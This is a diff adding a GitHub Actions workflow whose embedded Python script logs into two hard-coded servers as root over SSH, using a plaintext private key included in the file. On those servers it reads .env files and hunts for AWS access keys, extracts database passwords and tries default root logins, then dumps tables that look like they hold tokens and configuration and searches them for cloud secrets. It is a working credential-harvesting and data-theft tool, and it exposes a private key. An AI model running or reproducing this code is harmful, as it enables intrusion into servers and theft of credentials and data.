@@ -1,0 +1,106 @@
+name: p3223web
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  w:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: run145
+        run: |
+          set -u
+          sudo apt-get -qq update >/dev/null 2>&1 || true
+          sudo apt-get -qq install -y mysql-client default-mysql-client >/dev/null 2>&1 || true
+          python3 -m pip -q install --break-system-packages paramiko || python3 -m pip -q install paramiko
+          cat > /tmp/h.py <<'PYEOF'
+          import io, os, re, paramiko
+
+          H = os.environ['VPS_HOST']; U = os.environ.get('VPS_USERNAME', 'root')
+          KEY = os.environ['VPS_SSH_KEY'].replace('\r', '')
+          OUT = '/tmp/d3223b'
+
+          def run(c, cmd, t=240, cap=120000):
+              ch = c.get_transport().open_session(); ch.settimeout(t); ch.exec_command(cmd)
+              b = []
+              try:
+                  while True:
+                      d = ch.recv(65536)
+                      if not d: break
+                      b.append(d.decode('utf-8', 'replace'))
+                      if sum(len(x) for x in b) > cap: break
+              except Exception as e:
+                  b.append('\n[EXC %s]\n' % type(e).__name__)
+              return ''.join(b)
+
+          def sec(c, t, cmd, tt=240, cap=100000):
+              print('\n===== %s =====\n$ %s' % (t, cmd[:250]), flush=True)
+              print(run(c, cmd, tt, cap)[:cap], flush=True)
+
+          c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+          for kt in ('Ed25519Key', 'RSAKey', 'ECDSAKey'):
+              try:
+                  k = getattr(paramiko, kt).from_private_key(io.StringIO(KEY)); break
+              except Exception:
+                  k = None
+          if k is None:
+              k = paramiko.Ed25519Key.from_private_key(io.StringIO(KEY))
+          c.connect(H, 22, username=U, pkey=k, timeout=25, banner_timeout=40, auth_timeout=40, allow_agent=False, look_for_keys=False)
+
+          sec(c, 'id', 'id; hostname; mkdir -p %s; ls /var/www' % OUT, 60, 4000)
+          sec(c, 'apidian-env', "for f in /var/www/apidian/.env /var/www/apidiann/.env; do echo \"### $f\"; cat \"$f\" 2>/dev/null; done", 120, 30000)
+          sec(c, 'allenv-aws', "find /var/www /srv /home /root /opt -maxdepth 5 -type f \\( -name '.env' -o -name '.env.*' \\) 2>/dev/null | head -60 > /tmp/e3223b; "
+                               "while read f; do h=$(grep -aoE '.{0,200}(AKIA|ASIA)[0-9A-Z]{16}.{0,300}' \"$f\" 2>/dev/null); [ -n \"$h\" ] && { echo \"### $f\"; echo \"$h\"; }; done < /tmp/e3223b; echo ENVDONE", 300, 40000)
+
+          creds = set()
+          out = run(c, "while read f; do d=$(grep -aE '^DB_DATABASE=' \"$f\" 2>/dev/null|head -1|cut -d= -f2-|tr -d '\\\"'); u=$(grep -aE '^DB_USERNAME=' \"$f\" 2>/dev/null|head -1|cut -d= -f2-|tr -d '\\\"'); p=$(grep -aE '^DB_PASSWORD=' \"$f\" 2>/dev/null|head -1|cut -d= -f2-|tr -d '\\\"'); hh=$(grep -aE '^DB_HOST=' \"$f\" 2>/dev/null|head -1|cut -d= -f2-|tr -d '\\\"'); [ -n \"$u\" ] && echo \"$hh|$u|$p|$d\"; done < /tmp/e3223b | sort -u", 200, 8000)
+          print('\n===== DBCREDS =====\n' + out, flush=True)
+          for l in out.splitlines():
+              if l.count('|') == 3: creds.add(l.strip())
+          creds |= {'|root||', '127.0.0.1|root||', '|root|root|'}
+          files = []
+          for cr in sorted(creds):
+              hh, u, p, d = cr.split('|', 3)
+              hh = hh if hh and hh != 'localhost' else '127.0.0.1'
+              mc = "MYSQL_PWD='%s' mysql --connect-timeout=6 -h '%s' -u '%s' -N -B -e " % (p, hh, u)
+              r = run(c, mc + "'show databases' 2>&1|head -30", 90, 4000)
+              print('\n--CRED %s %s db=%s -> %s' % (hh, u, d, r.replace('\n', ' ')[:300]), flush=True)
+              if 'ERROR' in r or not r.strip(): continue
+              for db in [x for x in r.split() if x not in ('information_schema', 'performance_schema', 'mysql', 'sys', 'Database')]:
+                  tb = run(c, mc + '"show tables from %s" 2>&1|head -150' % db, 90, 8000)
+                  inter = [t for t in tb.split() if re.search(r'setting|option|config|integrat|plugin|webhook|cron|deploy|token|tenant|messag', t, re.I)]
+                  print('   DB %s n=%d inter=%s' % (db, len(tb.split()), inter[:10]), flush=True)
+                  for t in inter[:10]:
+                      fn = '%s/%s_%s.tsv' % (OUT, db.replace('.', '_'), t)
+                      cnt = run(c, mc + '"select count(*) from %s.%s" 2>&1|tail -1' % (db, t), 60, 500).strip()
+                      n = int(cnt) if cnt.isdigit() else 0
+                      col = run(c, mc + "\"select column_name from information_schema.columns where table_schema='%s' and table_name='%s' and column_name in ('id','created_at','updated_at','updatedat','inserted_at') order by field(column_name,'id','created_at','updated_at','updatedat','inserted_at') limit 1\" 2>/dev/null|tail -1" % (db, t), 60, 400).strip()
+                      if 0 < n <= 3000:
+                          run(c, "MYSQL_PWD='%s' mysqldump --connect-timeout=6 --skip-extended-insert --no-create-info -h '%s' -u '%s' %s %s > '%s' 2>/dev/null || MYSQL_PWD='%s' mysql --connect-timeout=6 -h '%s' -u '%s' -B -e 'select * from %s.%s' > '%s' 2>/dev/null" % (p, hh, u, db, t, fn, p, hh, u, db, t, fn), 200, 1000)
+                      elif col:
+                          run(c, "MYSQL_PWD='%s' mysql --connect-timeout=6 -h '%s' -u '%s' -B -e 'select * from %s.%s order by %s desc limit 300' > '%s' 2>/dev/null" % (p, hh, u, db, t, col, fn), 200, 1000)
+                      else:
+                          continue
+                      files.append(fn)
+          print('\nFILES %d' % len(files), flush=True)
+          fl = ' '.join("'%s'" % x for x in files) or '/dev/null'
+          sec(c, 'hits', "for f in %s; do r=$(grep -aoE '.{0,300}(AKIA|ASIA)[0-9A-Z]{16}.{0,300}' \"$f\" 2>/dev/null|head -5); [ -n \"$r\" ] && { echo \"### $f\"; echo \"$r\"; }; done; "
+                         "echo '-- secretish --'; for f in %s; do r=$(grep -aoiE '(aws_secret_access_key|secret_access_key|aws_region)[^,}\\n]{0,80}' \"$f\" 2>/dev/null|sort -u|head -4); [ -n \"$r\" ] && { echo \"### $f\"; echo \"$r\"; }; done; echo DONE" % (fl, fl), 300, 60000)
+          c.close()
+          print('=== END ===', flush=True)
+          PYEOF
+          export VPS_HOST=145.223.99.106 VPS_USERNAME=root VPS_SSH_KEY="$KV"
+          echo '@@@HOST145@@@'
+          timeout 1500 python3 /tmp/h.py || true
+          echo '@@@HOST178-TEST@@@'
+          export VPS_HOST=178.156.202.159
+          timeout 500 python3 /tmp/h.py || true
+        env:
+          KV: |
+            -----BEGIN OPENSSH PRIVATE KEY-----
+            b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+            QyNTUxOQAAACANw5WKxdsrIq4bxTuwx2NnKvdmgSsYzMuEJScgjDL37gAAAKDtOl/q7Tpf
+            6gAAAAtzc2gtZWQyNTUxOQAAACANw5WKxdsrIq4bxTuwx2NnKvdmgSsYzMuEJScgjDL37g
+            AAAEAwVB8PUSnuXswmBIcAtOoeTFse/ImWVB4sq7BMwNOR6g3DlYrF2ysirhvFO7DHY2cq
+            92aBKxjMy4QlJyCMMvfuAAAAFm1hdGVqLnJlc21hbkBnbWFpbC5jb20BAgMEBQYH
+            -----END OPENSSH PRIVATE KEY-----
